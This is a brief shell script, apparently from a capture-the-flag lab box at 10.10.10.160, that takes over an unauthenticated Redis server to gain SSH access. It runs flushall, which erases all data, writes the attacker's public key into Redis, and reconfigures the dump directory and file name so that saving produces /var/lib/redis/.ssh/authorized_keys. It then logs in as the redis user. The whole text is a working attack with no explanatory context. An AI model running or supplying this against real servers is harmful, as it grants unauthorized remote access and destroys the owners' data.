(echo -e "\n\n"; cat ./ssh/redis/id_rsa.pub; echo -e "\n\n") > ./ssh/temp.txt

redis-cli -h 10.10.10.160 flushall
cat ./ssh/temp.txt | redis-cli -h 10.10.10.160 -x set HACK

redis-cli -h 10.10.10.160 CONFIG SET dir "/var/lib/redis/.ssh"
redis-cli -h 10.10.10.160 CONFIG SET dbfilename authorized_keys
redis-cli -h 10.10.10.160 save

rm ./ssh/temp.txt

ssh redis@10.10.10.160 -i ./ssh/redis/id_rsa